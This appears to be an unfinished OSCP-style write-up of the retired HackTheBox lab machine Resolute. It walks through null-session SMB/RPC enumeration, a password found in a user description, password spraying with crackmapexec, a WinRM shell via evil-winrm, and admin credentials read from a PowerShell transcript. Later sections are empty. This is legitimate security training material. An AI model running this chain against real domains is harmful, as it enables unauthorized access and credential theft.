# HTB Resolute - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-11

---

## 0. Lesson Learned



---

## 1. Executive Summary



---

## 2. Scope

- **Target:** 10.129.96.155
- **Domain:** megabank.local
- **Environment:** HackTheBox Resolute (Retired Machine)
- **Testing Window:** 2026-3-10
- **Objective:** Complete domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Port Scan:

```
nmap -p- -sCV 10.129.96.155 -T4 -oA resolute_tcp
```

Key services identified:

- 53/tcp - DNS
- 88/tcp - Kerberos
- 135/tcp - RPC
- 139,445/tcp - SMB
- 389/tcp - LDAP
- 464/tcp - Kpasswd
- 593/tcp - RPC
- 5985/tcp - WinRM
- 3268,3269/tcp - Global Catalog

The host was identified as Windows Server 2016 within the megabank.local Active Directory domain.

---

## 5. Enumeration

Anonymous SMB authentication was possible, although shares were not accessible:

```
smbclient -L //10.129.96.155 -N
```

RPC enumeration was performed using a null session:

```
rpcclient -U "" -N 10.129.96.155
```

Domain users and groups were successfully enumerated:

```
enumdomusers

enumdomgroups
```

During user enumeration, the description field of user accounts was inspected:

```
queryuser 0x457
```

The following credentials wer discovered embedded in the user description:

```
marko : Welcome123!
```

---

## 6. Initial Access

The discovered password was tested against all domain users using password spraying:

```
crackmapexec winrm 10.129.96.155 -u usernames.txt -p 'Welcome123!'
```

Valid credentials were discovered for:

```
melanie : Welcome123!
```

Remote access was obtained through WinRM:

```
evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'
```

This provided a PowerShell session on the target system.

---

## 7. Post-Exploitation

After obtaining a shell as melanie, additional enumeration was performed:

```
whoami

whoami /priv

whoami /groups
```

File system exploration revealed a PowerShell transcripts directory on the root drive:

```
cd C:\

dir -force
```

A folder named PSTranscripts was identified:

```
cd C:\PSTranscripts
```

Inside the directory, a Powershell transcript file was discovered:

```
type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

The transcript contained administrative command history including credentials:

```
ryan : Serv3r4Admin4cc123!
```

---

## 8. Privilege Escalation



---

## 9. Proof of Compromise

---

## 10. Findings & Recommendations

---

## 11. Appendix